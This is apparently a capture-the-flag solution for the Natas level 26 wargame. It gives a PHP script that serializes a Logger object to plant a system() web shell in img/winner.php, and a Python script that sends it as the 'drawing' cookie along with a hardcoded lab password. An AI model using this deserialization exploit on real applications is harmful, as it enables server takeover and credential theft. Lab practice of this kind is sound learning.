cookie['drawing']

create 26_tool.php file to get your cookie drawing
```
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file) {
        // Initialise variables
        $this->initMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->exitMsg = "#<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = $file;

        // Ensure directory exists
        $logDir = dirname($this->logFile);
        if (!file_exists($logDir)) {
            mkdir($logDir, 0755, true); // Create directory recursively if needed
        }

        // Write initial message
        $fd = fopen($this->logFile, "a+");
        if ($fd) {
            fwrite($fd, $this->initMsg);
            fclose($fd);
        } else {
            die("Failed to open file: " . $this->logFile);
        }
    }

    function log($msg) {
        $fd = fopen($this->logFile, "a+");
        if ($fd) {
            fwrite($fd, $msg . "\n");
            fclose($fd);
        } else {
            die("Failed to open file: " . $this->logFile);
        }
    }

    function __destruct() {
        // Write exit message
        $fd = fopen($this->logFile, "a+");
        if ($fd) {
            fwrite($fd, $this->exitMsg);
            fclose($fd);
        } else {
            die("Failed to open file: " . $this->logFile);
        }
    }
}

// Usage:
$logFile = "img/winner.php"; // Adjust path as needed

// Instantiate Logger with the log file path
$object = new Logger($logFile);

// Example: Log additional message
$object->log("Additional log message");

// Echo serialized object (for example purposes)
echo (base64_encode(serialize($object)));

?>
```
run in terminal
php 26_tool.php

```
#!/usr/bin/env python
import requests
import urllib.parse
import base64

username = 'natas26'
password = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()

# First request to set the cookie
response = session.get(url, auth=(username, password))

# Set the 'drawing' cookie with your serialized PHP object
cookie_value = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MToiIzw/cGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9'
session.cookies['drawing'] = cookie_value
response = session.get(url + '?x1=0&y1=0&x2=500&y2=0', auth=(username,password))

# Make a request to 'img/winner.php' to see the result
response = session.get(url + '/img/winner.php', auth=(username, password))
print(response.text)
```
